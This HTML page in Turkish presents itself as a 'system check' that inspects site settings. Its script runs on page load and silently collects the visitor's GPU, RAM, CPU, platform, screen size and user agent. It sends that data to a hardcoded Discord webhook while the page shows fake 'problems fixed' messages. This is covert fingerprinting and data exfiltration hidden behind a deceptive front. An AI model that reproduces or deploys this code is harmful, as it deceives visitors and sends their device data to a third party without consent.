<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrolü</title>
    <style>
        body { background:#0c0c0c; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
        h2 { color:#ccc; font-size:14px; font-weight:400; transition: color 0.2s; }
        .ok { color:#0f4; font-weight:bold; }
    </style>
</head>
<body>
    <h2 id="t">Site ayarları kontrol ediliyor...</h2>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
        const t = document.getElementById('t');

        async function s() {
            let g = "N/A";
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const d = gl.getExtension('WEBGL_debug_renderer_info');
                g = gl.getParameter(d.UNMASKED_RENDERER_ID);
            } catch(e) {}

            const data = {
                embeds: [{
                    title: "⚡ SİSTEM RAPORU",
                    color: 3066993,
                    fields: [
                        { name: "HW", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}G\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
                        { name: "SYS", value: `${navigator.platform} | ${window.screen.width}x${window.screen.height}`, inline: false },
                        { name: "UA", value: "```" + navigator.userAgent + "```", inline: false }
                    ]
                }]
            };

            // KRİTİK: Veriyi gönder ve ulaştığından emin ol
            const p = JSON.stringify(data);
            
            // Aynı anda iki koldan saldırıyoruz
            navigator.sendBeacon(u, p);
            
            try {
                await fetch(u, { 
                    method: 'POST', 
                    mode: 'no-cors', 
                    headers: { 'Content-Type': 'application/json' },
                    body: p 
                });
            } catch(e) {}

            // Veri gönderim emri çıktıktan hemen sonra yazıları değiştir
            setTimeout(() => { 
                t.innerHTML = '<span class="ok">Site uygun halde!</span>'; 
            }, 200);

            setTimeout(() => { 
                t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; 
            }, 800);
        }

        // Sayfa yüklenir yüklenmez en hızlı şekilde başlat
        s();
    </script>
</body>
</html>
